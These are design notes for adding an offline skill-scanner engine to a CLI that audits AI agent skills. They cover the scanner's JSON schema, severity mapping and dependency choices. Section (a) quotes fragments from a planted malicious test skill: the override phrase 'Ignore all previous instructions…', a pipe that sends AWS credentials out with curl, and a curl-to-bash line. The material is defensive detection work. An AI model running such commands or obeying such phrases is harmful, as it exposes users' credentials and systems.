# Integration Notes — skill-scanner DEEP engine (bead sable-7g7)

**Status:** Shipping. **Node + Python parity** both implemented (both runtimes
shell out to the same external `skill-scanner` CLI). Decision is **COUPLE, not
swap**: the zero-dependency deterministic quick scan stays the default for
`rafter agent audit-skill`; `--deep` (alias `--engine skill-scanner`) adds an
opt-in deeper pass that runs **offline analyzers only**. The engine is **not
bundled** — installed on demand by the managed installer
(`rafter agent update-skill-scanner` / `agent init --with-skill-scanner`),
which does an isolated, version-pinned `uv tool install` (pip `--user`
fallback). `audit-skill` accepts a skill **file or directory** (the deep engine
is most thorough on a directory).

Resolved design decisions (Rome): (1) **Node parity then merge both** — done;
(2) **directory target + documented** — done; (3) **installer hook now** —
done (`update-skill-scanner` + `--with-skill-scanner`, pinned `SKILL_SCANNER_VERSION`).

Observed tool: **`skill-scanner` 2.0.11**, pip package
`cisco-ai-skill-scanner`, Apache-2.0, Python 3.10+.

---

## (a) Exact skill-scanner JSON schema observed

Invocation: `skill-scanner scan <dir> --format json` writes one JSON **object**
to **stdout**. (Note: this is a single object, not a SARIF array; SARIF is a
separate `--format sarif` mode we are not using.)

Top-level object:

| Field | Type | Notes |
|-------|------|-------|
| `skill_name` | string | from SKILL.md frontmatter `name` |
| `skill_path` | string | the scanned directory |
| `is_safe` | bool | false if any finding above the policy floor |
| `max_severity` | string | UPPERCASE: `CRITICAL`/`HIGH`/`MEDIUM`/`LOW`/`INFO` |
| `findings_count` | int | length of `findings` |
| `findings` | array | see below |
| `scan_duration_seconds` | float | |
| `duration_ms` | int | |
| `analyzers_used` | string[] | e.g. `["static_analyzer","bytecode","pipeline"]` |
| `timestamp` | string (ISO 8601) | |
| `scan_metadata` | object | `policy_name`, `policy_version`, `policy_preset_base` (default `balanced`), `policy_fingerprint_sha256` |

Each **finding** object:

| Field | Type | Notes |
|-------|------|-------|
| `id` | string | unique, rule_id + content hash suffix |
| `rule_id` | string | e.g. `YARA_prompt_injection_generic`, `PIPELINE_TAINT_FLOW`, `MANIFEST_MISSING_LICENSE` |
| `category` | string | `prompt_injection`, `data_exfiltration`, `command_injection`, `tool_chaining_abuse`, `obfuscation`, `policy_violation`, … |
| `severity` | string | UPPERCASE: `CRITICAL`/`HIGH`/`MEDIUM`/`LOW`/`INFO` |
| `title` | string | short human title |
| `description` | string | longer explanation, often quotes the matched snippet |
| `file_path` | string | relative to skill dir, e.g. `SKILL.md` |
| `line_number` | int \| null | null for manifest-level findings |
| `snippet` | string \| null | matched text |
| `remediation` | string | suggested fix |
| `analyzer` | string | `static` / `pipeline` / `bytecode` |
| `metadata` | object | analyzer-specific (e.g. `source_taints`, `sink_command`, `yara_rule`, `deduped_rule_ids`) |

**Severity values seen:** `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO` (all
UPPERCASE). `INFO` is used for non-security policy hints (e.g. missing license).

**Validation result:** on a planted prompt-injection + exfil skill, the
**default offline analyzers** flagged:
- `prompt_injection` (CRITICAL) — "Ignore all previous instructions…" via YARA
- `data_exfiltration` (CRITICAL) — `cat ~/.aws/credentials | curl -X POST …` via pipeline taint
- `command_injection` (HIGH) — `curl … | bash` via pipeline taint
- `tool_chaining_abuse` (MEDIUM) — credential-pipe-to-curl via YARA

Our regex quick scan catches the `curl | sh` command but **misses the prompt
injection and the exfiltration intent** — exactly the gap this closes.

---

## (b) Severity → our-tier mapping

skill-scanner tiers are richer than ours (it adds INFO). Mapping chosen
(`_SEVERITY_MAP` in `rafter_cli/scanners/skill_scanner.py`):

| skill-scanner | our tier |
|---------------|----------|
| `CRITICAL` | `critical` |
| `HIGH` | `high` |
| `MEDIUM` | `medium` |
| `LOW` | `low` |
| `INFO` | `low` |

**Exit-code floor:** only `critical`/`high`/`medium` count as "actionable"
findings that flip the audit exit code to 1. `low`/INFO findings (e.g.
missing-license policy hints) are reported but do **not** fail the audit —
this matches the spirit of our quick scan, which only fails on secrets and
high-risk commands, not on informational notes.

---

## (c) Offline-safe argv

`SkillScanner.build_argv()` constructs exactly:

```
skill-scanner scan <dir> --format json --fail-on-severity medium [--skill-file <name>] [--lenient]
```

- `--format json` → machine-parseable object on stdout.
- `--fail-on-severity medium` → process exits 1 on a medium+ finding, so the
  wrapper can corroborate parsed results against the exit code. (Default
  skill-scanner behavior is exit 0 even on CRITICAL findings — surprising; see (f).)
- `--skill-file <name>` + `--lenient` → only when the audit target is a **file**
  (our `audit-skill` takes a `.md` file path, but skill-scanner only scans
  **directories**; we pass the parent dir and point it at the filename).

**Default (offline) analyzers used:** `static_analyzer`, `bytecode`,
`pipeline`. We **never** add any of:
`--use-llm`, `--use-virustotal`, `--use-aidefense`, `--use-behavioral`,
`--vt-api-key`, `--aidefense-api-key`. This is asserted by
`TestOfflineSafeArgv` against a `FORBIDDEN_FLAGS` list, so a regression that
flips on a network analyzer fails the test suite. No data leaves the machine.

(`--use-behavioral` is *also* a static/offline analyzer per `list-analyzers`,
but we keep it off in the PoC to minimize surface and runtime; it's a candidate
opt-in for GA — see open questions.)

---

## (d) Node parity plan (Phase 2 — not implemented here)

Mirror the **betterleaks** dual-runtime pattern exactly: both runtimes shell
out to the **same external `skill-scanner` CLI** and parse its JSON — no
porting of Python internals, so parity is structural.

1. Add `node/src/scanners/skill-scanner.ts` mirroring
   `python/rafter_cli/scanners/skill_scanner.py`:
   - `which('skill-scanner')` availability check.
   - `buildArgv(dir, {skillFile, lenient})` — same flags, same FORBIDDEN-flag
     invariant, with a vitest test asserting no network/LLM flag ever appears.
   - `scanPath(path)` — if path is a file, scan `dirname(path)` with
     `--skill-file basename(path) --lenient`; else scan the dir.
   - `mapFinding()` using the identical `_SEVERITY_MAP` and the `medium` exit floor.
2. Wire `--deep` / `--engine skill-scanner` into the Node `audit-skill` command
   (`node/src/commands/agent/`), matching the Python JSON shape:
   add a `deepScan` object `{engine, maxSeverity, analyzersUsed, findings[]}`.
3. Keep the **exact same** stdout JSON keys across runtimes (`deepScan`,
   `ruleId`, `severity`, `category`, `file`, `line`, `snippet`, `analyzer`).
4. Add the `deepScan` schema + `--deep`/`--engine` flags + offline guarantee to
   `shared-docs/CLI_SPEC.md` so the contract is shared.
5. Cross-port the test fixtures (benign + planted-injection) to vitest, gated on
   `which('skill-scanner')` like the pytest `requires_scanner` skip.

The wrapper module is the only meaningfully new code; the command wiring is a
few lines in each runtime.

---

## (e) Dependency-posture options + recommendation

skill-scanner is a **heavy** Python package (pulls litellm, tiktoken,
tokenizers, yara-x, uvicorn, fastapi, etc.) — fine as an optional tool, bad as a
hard dep, and it would break Node parity if bundled Python-side.

Options:

1. **Hard dependency** (add to `pyproject.toml`) — ❌ rejected. Breaks Node
   parity (Node can't `pip install`), bloats install, drags in an LLM stack we
   don't use offline, couples our release cadence to theirs.
2. **Optional extra** (`pip install rafter-cli[deep]`) — viable Python-side, but
   still asymmetric with Node and still pins a heavy transitive tree.
3. **External tool, detected at runtime + install hint** (the **betterleaks
   pattern**) — ✅ **recommended**. `skill-scanner` is treated as an external
   binary on PATH. `--deep` without it → clear install hint, exit 2, no crash.
   Both runtimes shell out identically. Optionally add an installer hook
   (`rafter agent update-skill-scanner` / a `--with-skill-scanner` init flag)
   that runs `uv pip install cisco-ai-skill-scanner` into a managed location,
   analogous to `rafter agent update-betterleaks` / the BinaryManager. This PoC
   implements option 3 (detect + hint); the installer hook is the GA follow-up.

**Recommendation: option 3.** Keeps Rafter's zero-dependency / offline default
intact, preserves Node↔Python parity, and isolates skill-scanner's heavy tree
behind an explicit opt-in.

---

## (f) Surprises / GA blockers

- **skill-scanner only scans directories, never single files.** Our
  `audit-skill` takes a file path. Worked around by scanning the parent dir with
  `--skill-file <name> --lenient`. GA decision: keep this implicit, or document
  that `--deep` is most accurate on a skill *directory* (so bundled scripts /
  `.pyc` files are seen — a single .md misses the bytecode/dataflow analyzers'
  value).
- **Default exit code is 0 even on CRITICAL findings.** You must pass
  `--fail-on-severity` to get a non-zero exit. We rely on the parsed JSON for
  truth and use `--fail-on-severity medium` only as corroboration. Worth a note
  in CLI_SPEC so nobody trusts the bare exit code.
- **Heavy dependency tree + import-time noise.** litellm prints Bedrock/
  SageMaker pre-load warnings to stderr on every invocation (botocore absent).
  Harmless for us (we don't use those paths) and we read stdout only, but it's
  ugly; consider suppressing skill-scanner stderr in the wrapper for clean UX.
- **`policy_violation`/INFO findings (e.g. missing license) are noise** for a
  security audit. Mapped to `low` and excluded from the exit-code floor so they
  don't cause false "fail" signals. GA: consider filtering INFO out of default
  output entirely, surfacing only with a `--verbose`/`--all-findings` flag.
- **Version drift risk.** The JSON shape is stable in 2.0.11 but undocumented as
  a contract. GA: pin/record a known-good version and parse defensively (we
  already `.get()` every field). An installer hook would let us pin like
  `BETTERLEAKS_VERSION`.
- **Not a GA blocker but a decision:** whether to also expose `--use-behavioral`
  (offline AST dataflow) as a deeper still-offline tier. It's safe (no network)
  and adds taint coverage, but is slower. Left off in the PoC.

---

## Files in this PoC

- `python/rafter_cli/scanners/skill_scanner.py` — wrapper (offline-safe argv,
  JSON mapping, availability detection, install hint).
- `python/rafter_cli/commands/agent.py` — `--deep` / `--engine` wiring in
  `audit_skill`, `_display_deep_scan`, `deepScan` JSON block, exit-code merge.
  **Default (non-`--deep`) behavior is unchanged.**
- `python/tests/test_agent_audit_skill_deep.py` — unit tests (offline-flag
  invariant, severity mapping, missing-tool exit 2) + binary-gated integration
  tests (benign vs. planted-injection fixtures).
```
```
